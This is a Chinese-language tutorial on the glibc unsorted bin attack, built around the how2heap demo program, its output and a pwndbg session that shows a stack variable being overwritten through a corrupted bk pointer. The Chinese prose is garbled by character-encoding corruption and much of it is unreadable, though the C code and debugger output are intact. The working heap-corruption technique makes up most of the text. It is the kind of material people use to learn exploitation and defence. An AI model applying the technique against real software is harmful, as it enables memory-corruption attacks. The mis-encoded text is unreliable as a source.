# how2heapä¹‹unsorted bin&&largebin
|
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
> æ¬¢è¿å„ä½å–œæ¬¢å®‰å…¨çš„å°ä¼™ä¼´ä»¬åŠ å…¥æ˜Ÿç›Ÿå®‰å…¨ UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
> æœ¬æ–‡åŒ…æ‹¬unsorted bin attack,unsorted bin into stack,large bin attck
PS:ç”±äºæœ¬äººæ‰ç–å­¦æµ…,æ–‡ä¸­å¯èƒ½ä¼šæœ‰ä¸€äº›ç†è§£çš„ä¸å¯¹çš„åœ°æ–¹,æ¬¢è¿å„ä½æ–§æ­£ ğŸ™‚
## å‚è€ƒç½‘ç«™
    https://ctf-wiki.github.io/ctf-wiki/pwn/
    https://www.anquanke.com/post/id/85127
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
    https://www.freebuf.com/articles/system/209096.html
    https://bbs.pediy.com/thread-223283.htm
    https://xz.aliyun.com/t/5177?accounttraceid=d0a1f6bd7256460885a64d78c885c8caznnf
    https://www.anquanke.com/post/id/183877
## 0x01 unsorted bin attack
###  åº
unsoted bin attackçš„æ€ä¼¤åŠ›è™½ç„¶ä¸å¤Ÿ,ä½†ä¹Ÿæ˜¯ä¸å¯å°è§†çš„è¾…åŠ©æ”»å‡»æ–¹å¼,ç¬¬ä¸€ä¸ªæˆ‘ä»¬å°±å…ˆæ¥çœ‹unsorted bin attackå§
wikiä¸Šçš„[ä»‹ç»](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/)
è¿™é‡Œç®€è¦ä»‹ç»ä¸€ä¸‹:
åœ¨_int_mallocä¸­æœ‰è¿™ä¹ˆä¸€æ®µä»£ç ,ä»–ä¼šåœ¨unsorted binå–å‡ºæ—¶è¢«è°ƒç”¨:
    unsorted_chunks (av)->bk = bck;
    bck->fd = unsorted_chunks (av);
é‚£ä¹ˆè¿™ä¸ªbckæ˜¯ä»€ä¹ˆå‘¢?
    bck = victim->bk
å› æ­¤æˆ‘ä»¬åªéœ€è¦æ§åˆ¶bkæŒ‡é’ˆå°±å¯ä»¥è®©bckä½ç½®å¯æ§ï¼Œè€Œæˆ‘ä»¬çš„bck->fdä¹Ÿå°±å¯æ§äº†ï¼Œæ­¤æ—¶å°±å¯ä»¥å¾€ä»»æ„åœ°å€å†™ä¸€ä¸ªä¸œè¥¿,ä½†æ˜¯å†™çš„ä¸œè¥¿ä¸å½’æˆ‘ä»¬æ§åˆ¶,å› æ­¤åªèƒ½æ‰“è¾…åŠ©2333
###  æºä»£ç 
è¿™ä¸ªä»£ç çœŸå¿ƒå°‘å•Šæˆ‘è¯´2333,åŒæ ·çš„,æˆ‘åŠ äº†ä¸€ç‚¹æ³¨é‡Šåˆ äº†äº›ä¸œè¥¿
ä½œè€…çš„è¯çš„å¤§æ¦‚æ„æ€:
æœ¬demoä½¿ç”¨unsorted bin attackæŠ€å·§å°†ä¸€ä¸ªå¾ˆå¤§çš„æ— ç¬¦å·longå‹å€¼å†™è¿›äº†æ ˆé‡Œ
åœ¨å®é™…ä¸­,unsorted bin attackå¸¸å¸¸ç”¨äºä¸ºå…¶ä»–çš„æ”»å‡»åšè¾…åŠ©,æ¯”å¦‚è¦†å†™global_max_fastæ¥ä¸ºfastbin attackåšè¾…åŠ©
    #include 
    #include 
    int main(){
            unsigned long stack_var=0;
            //stack_varå°±æ˜¯æˆ‘ä»¬çš„æ”»å‡»ç›®æ ‡
            fprintf(stderr, "Let's first look at the target we want to rewrite on stack:n");
            fprintf(stderr, "%p: %ldnn", &stack_var, stack_var);
            unsigned long *p=malloc(400);
            // æˆ‘ä»¬å…ˆåœ¨å †ä¸Šåˆ†é…ä¸€ä¸ªæ­£å¸¸çš„chunk
            fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %pn",p);
            //å¹¶ä¸”åˆ†é…å¦ä¸€ä¸ªæ­£å¸¸çš„chunkæ¥é¿å…freeç¬¬ä¸€ä¸ªchunkæ—¶è¯¥chunkä¸top chunkåˆå¹¶
            fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
               "the first one during the free()nn");
            malloc(500);
            free(p);
            //ç°åœ¨æˆ‘ä»¬é‡Šæ”¾çš„på°†ä¼šè¢«æ”¾å…¥unsorted binä¸­,å¹¶ä¸”å…¶bkæŒ‡å‘p[1]
            fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
                       "point to %pn",(void*)p[1]);
            //------------VULNERABILITY-----------    
            p[1]=(unsigned long)(&stack_var-2);
            //ç°åœ¨æˆ‘ä»¬æ¨¡æ‹Ÿæœ‰ä¸€ä¸ªæ¼æ´è®©æˆ‘ä»¬å¯ä»¥è¦†å†™victim->bkæŒ‡é’ˆ
            fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointern");
            fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%pnn",(void*)p[1]);
            //------------------------------------    
            malloc(400);
            //ç°åœ¨æˆ‘ä»¬å†åˆ†é…ä¸€æ¬¡æ¥å–å›æˆ‘ä»¬åˆšåˆšfreeæ‰çš„chunk,æ­¤æ—¶æ”»å‡»ç›®æ ‡å·²ç»è¢«æ”¹å†™äº†
            fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
                       "rewritten:n");
            fprintf(stderr, "%p: %pn", &stack_var, (void*)stack_var);
    }
###  è¿è¡Œç»“æœ
    This file demonstrates unsorted bin attack by write a large unsigned long value into stack
    In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack
    Let's first look at the target we want to rewrite on stack:
    0x7ffdabb6d048: 0
    Now, we allocate first normal chunk on the heap at: 0x16d6010
    And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()
    We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7fb225384b78
    Now emulating a vulnerability that can overwrite the victim->bk pointer
    And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffdabb6d038
    Let's malloc again to get the chunk we just free. During this time, the target should have already been rewritten:
    0x7ffdabb6d048: 0x7fb225384b78
###  è°ƒè¯•
æ–­ç‚¹ä½ç½®
       9   unsigned long stack_var=0;
     â–º 10         fprintf(stderr, "Let's first look at the target we want to rewrite on stack:n");
     â–º 13         unsigned long *p=malloc(400);
     â–º 17   malloc(500);
       19   free(p);
     â–º 20         fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
       25   p[1]=(unsigned long)(&stack_var-2);
     â–º 26         fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointern");
       31   malloc(400);
     â–º 32         fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
ä¸‹é¢æˆ‘ä»¬ç›´æ¥è¿è¡Œçœ‹ä¸‹,é¦–å…ˆç»™å®šä¹‰å˜é‡stack_var,èµ‹åˆå€¼ä¸º0
    pwndbg> p stack_var
    $2 = 0
    pwndbg> p &stack_var
    $3 = (unsigned long *) 0x7fffffffe5c8
ä¸‹é¢mallocä¸€ä¸‹
    pwndbg> heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6021a0 PREV_INUSE {
      prev_size = 0,
      size = 134753,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
ç„¶åmalloc(500)æ¥é˜²æ­¢p freeçš„æ—¶å€™ä¸top chunkåˆå¹¶
    pwndbg> heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6021a0 PREV_INUSE {
      prev_size = 0,
      size = 513,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6023a0 PREV_INUSE {
      prev_size = 0,
      size = 134241,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
ç„¶åé‡Šæ”¾p,pè¢«æ’å…¥åˆ°unsortedbinä¸­
    pwndbg> heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x7ffff7dd1b78 ,
      bk = 0x7ffff7dd1b78 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x602000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x602000
    smallbins
    empty
    largebins
    empty
æ­¤æ—¶çš„p[1]
    pwndbg> p/x p[1]
    $5 = 0x7ffff7dd1b78
    pwndbg> x/10gx p[1]
    0x7ffff7dd1b78 : 0x00000000006023a0      0x0000000000000000
    0x7ffff7dd1b88 :        0x0000000000602000      0x0000000000602000
    0x7ffff7dd1b98 :        0x00007ffff7dd1b88      0x00007ffff7dd1b88
    0x7ffff7dd1ba8 :        0x00007ffff7dd1b98      0x00007ffff7dd1b98
    0x7ffff7dd1bb8 :        0x00007ffff7dd1ba8      0x00007ffff7dd1ba8
ç„¶åç»™p[1]èµ‹å€¼
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x7ffff7dd1b78 ,
      bk = 0x7fffffffe5b8,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all [corrupted]
    FD: 0x602000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x602000
    BK: 0x602000 â€”â–¸ 0x7fffffffe5b8 â€”â–¸ 0x602010 â—‚â€” 0x0
    smallbins
    empty
    largebins
    empty
å¯ä»¥çœ‹åˆ°,æˆ‘ä»¬çš„bkæŒ‡é’ˆå·²ç»è¢«ä¿®æ”¹ä¸ºäº†&stack-2çš„ä½ç½®,ä¹Ÿå°±æ˜¯
    pwndbg> p &stack_var
    $13 = (unsigned long *) 0x7fffffffe5c8
    pwndbg> p/x  0x7fffffffe5c8- 0x7fffffffe5b8
    $14 = 0x10
ç„¶åæˆ‘ä»¬å–å‡ºæˆ‘ä»¬çš„unsorted bin
    pwndbg> p/x stack_var
    $15 = 0x7ffff7dd1b78
å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„var_stackçš„å€¼å·²ç»è¢«å†™æˆäº†æˆ‘ä»¬unsortedbin(av)çš„å€¼äº†